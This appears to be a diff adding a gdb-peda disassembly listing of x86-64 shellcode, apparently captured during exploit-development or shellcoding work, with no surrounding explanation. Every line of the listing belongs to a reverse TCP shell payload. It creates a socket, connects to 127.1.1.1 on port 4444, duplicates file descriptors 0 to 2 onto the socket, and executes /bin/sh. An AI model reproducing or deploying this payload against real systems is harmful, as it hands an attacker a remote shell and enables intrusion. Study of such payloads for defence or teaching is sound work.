@@ -1,0 +1,37 @@
+=> 0x555555558040 <shellcode>:  push   0x29
+   0x555555558042 <shellcode+2>:        pop    rax
+   0x555555558043 <shellcode+3>:        cdq
+   0x555555558044 <shellcode+4>:        push   0x2
+   0x555555558046 <shellcode+6>:        pop    rdi
+   0x555555558047 <shellcode+7>:        push   0x1
+   0x555555558049 <shellcode+9>:        pop    rsi
+   0x55555555804a <shellcode+10>:       syscall
+   0x55555555804c <shellcode+12>:       xchg   rdi,rax
+   0x55555555804e <shellcode+14>:       movabs rcx,0x101017f5c110002
+   0x555555558058 <shellcode+24>:       push   rcx
+   0x555555558059 <shellcode+25>:       mov    rsi,rsp
+   0x55555555805c <shellcode+28>:       push   0x10
+   0x55555555805e <shellcode+30>:       pop    rdx
+   0x55555555805f <shellcode+31>:       push   0x2a
+   0x555555558061 <shellcode+33>:       pop    rax
+   0x555555558062 <shellcode+34>:       syscall
+   0x555555558064 <shellcode+36>:       push   0x3
+   0x555555558066 <shellcode+38>:       pop    rsi
+   0x555555558067 <shellcode+39>:       dec    rsi
+   0x55555555806a <shellcode+42>:       push   0x21
+   0x55555555806c <shellcode+44>:       pop    rax
+   0x55555555806d <shellcode+45>:       syscall
+   0x55555555806f <shellcode+47>:       jne    0x555555558067 <shellcode+39>
+   0x555555558071 <shellcode+49>:       push   0x3b
+   0x555555558073 <shellcode+51>:       pop    rax
+   0x555555558074 <shellcode+52>:       cdq
+   0x555555558075 <shellcode+53>:       movabs rbx,0x68732f6e69622f
+   0x55555555807f <shellcode+63>:       push   rbx
+   0x555555558080 <shellcode+64>:       mov    rdi,rsp
+   0x555555558083 <shellcode+67>:       push   rdx
+   0x555555558084 <shellcode+68>:       push   rdi
+   0x555555558085 <shellcode+69>:       mov    rsi,rsp
+   0x555555558088 <shellcode+72>:       syscall
+   0x55555555808a <shellcode+74>:       add    BYTE PTR [rax],al
+gdb-peda$ x/35i $rip
+
